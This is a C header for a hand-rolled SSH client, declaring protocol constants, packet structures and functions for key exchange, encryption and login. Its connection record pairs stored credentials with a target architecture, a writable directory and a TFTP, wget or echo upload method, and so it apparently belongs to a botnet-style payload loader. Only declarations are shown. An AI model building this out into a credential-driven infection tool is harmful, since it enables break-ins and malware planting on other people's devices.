#include "include.h"
#include "dh.h"
#include "aes.h"
#include "sha256.h"
#include "hmac_sha256.h"
#include <stdio.h>
#include <stdint.h>

#define SSH_LINE_SIZE 2048
#define SSH_DISCONNECT                 1
#define SSH_SERVICE_REQUEST            5
#define SSH_SERVICE_REQUEST_ACCEPT     6
#define SSH_KEXINIT                    20
#define SSH_NEWKEYS                    21
#define SSH_KEX_ECDH_INIT              30
#define SSH_KEX_ECDH_REPLY             31
#define SSH_USERAUTH_REQUEST           50
#define SSH_USERAUTH_FAILURE           51
#define SSH_USERAUTH_SUCCESS           52
#define SSH_GLOBAL_REQUEST             80
#define SSH_CHANNEL_OPEN               90
#define SSH_CHANNEL_OPEN_CONFIRMATION  91
#define SSH_CHANNEL_OPEN_FAILURE       92
#define SSH_CHANNEL_WINDOW_ADJUST      93
#define SSH_CHANNEL_DATA               94
#define SSH_CHANNEL_EXTENDED_DATA      95
#define SSH_CHANNEL_EOF                96
#define SSH_CHANNEL_CLOSE              97     
#define SSH_CHANNEL_REQUEST            98
#define SSH_CHANNEL_SUCCESS            99
#define SSH_CHANNEL_FAILURE            100

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define TRUE 1
#define FALSE 0
typedef char BOOL;
typedef unsigned char u_char;
typedef uint32_t ipv4_t;
typedef uint16_t port_t;
typedef struct AES_ctx AES_ctx_t;

typedef struct _ssh_packet{
    int payload_size;
    unsigned char *payload;
    unsigned char *ptr;
} ssh_packet;

typedef struct _connection_info{
    BOOL has_arch;
    BOOL has_writedir;
    char username[32], password[32], arch[6], writedir[32];
    ipv4_t addr;
    port_t port;
    enum {
        NONE,
        TFTP,
        WGET,
        ECHO,
    } upload_method;
} connection_info;

typedef struct _connection{
	int sockfd;
	char *buff;
	int buffpos,buffsize;
} connection;

typedef struct _ssh_connection{
    BOOL encrypt;
    ssh_packet* I_C;
    ssh_packet* I_S;
    unsigned char* V_S;
    int send_packet_counter;
    int rec_packet_counter;
    int recipient_channel;
    int linepos;
    dh_ctx* dh;
	AES_ctx_t* out_aes; // client -> server
	AES_ctx_t* in_aes; //server -> client
	unsigned char* in_mac_aes;
	unsigned char* out_mac_aes;
    connection_info info;
    connection connection;
    char* line;
} ssh_connection;

BOOL ssh_next_line(ssh_connection*,ssh_packet**);
int has_new_line(ssh_connection*);
void lprintf(const char*,const char*, ...);
void change_auth(ssh_connection*);
void ssh_cleanup_and_close(ssh_connection*,BOOL);
#ifdef DEBUG
char* PacketToString(ssh_packet*);
char* MessageCodeToString(uint8_t);
void read_ssh_packet_channel_open_failure(ssh_packet*);
void read_ssh_packet_channel_window_adjust(ssh_packet*);
void read_ssh_packet_global_request(ssh_packet*);
#endif
void ssh_print_packet(ssh_packet*);
void ssh_packet_reset_ptr(ssh_packet*);
uint8_t ssh_packet_msg_code(ssh_packet*);
uint8_t ssh_packet_padding_length(ssh_packet*);
int con_tcp(ipv4_t,port_t);
int str_search(char*,int,char*,int);
void read_ssh_packet_DH_reply(ssh_connection*,ssh_packet*);
void read_ssh_packet_disconnect(ssh_packet*);
u_char* read_ssh_packet_channel_data(ssh_packet*,int*);
int consume_ssh_protocol(ssh_connection*);
int handle_recv(ssh_connection*,ssh_packet**);
void init(ipv4_t,port_t,char*,char*);
void read_ssh_packet_channel_confirm(ssh_connection*,ssh_packet*);
ssh_packet* create_ssh_disconnect(ssh_connection*);
ssh_packet* create_ssh_channel_data(ssh_connection*,char*);
ssh_packet* create_ssh_channel_request(ssh_connection*);
ssh_packet* create_ssh_channel_open(ssh_connection*);
ssh_packet* create_ssh_userauth_request(ssh_connection*);
ssh_packet* create_ssh_packet_DHE(ssh_connection*);
ssh_packet* create_ssh_packet_service_request(ssh_connection*);
ssh_packet* create_ssh_packet_kexinit(ssh_connection*);
u_char* create_ssh_hash(ssh_connection*,u_char*,int,u_char*,int,u_char*,int);
void ssh_hash(u_char*,int,u_char*,char,BYTE[]);
void create_ssh_keys(ssh_connection*,u_char*,int,u_char*);
uint8_t get_padding_length(int,int);
uint8_t add_random_hex(u_char*,int);
uint8_t add_padding(ssh_packet*);
ssh_packet* create_ssh_packet(ssh_connection*,int,int);
void ssh_packet_create_hmac(ssh_connection*,ssh_packet*);
void send_ssh_packet(ssh_connection*,ssh_packet*);
void packet_free(ssh_packet*);
BOOL ssh_packet_range(ssh_packet*,int);
int ptr_put_bn(u_char*,bn_t*);
int ptr_put_u32(u_char*,int);
int ptr_read_u32(u_char*);
u_char* ssh_packet_read_str(ssh_packet*,int*);
int ssh_packet_read_u32(ssh_packet*);
int ssh_packet_put_u32(ssh_packet*,int);
int ssh_packet_put_bool(ssh_packet*,BOOL);
bn_t* ssh_packet_read_bn(ssh_packet*);
int ssh_packet_put_bn(ssh_packet*,bn_t*);
int ptr_put_str(u_char*,char*,int);
int ssh_packet_put_str(ssh_packet*,char*);
int _ssh_packet_put_str(ssh_packet*,char*,int);
ssh_packet* read_ssh_packet(ssh_connection*);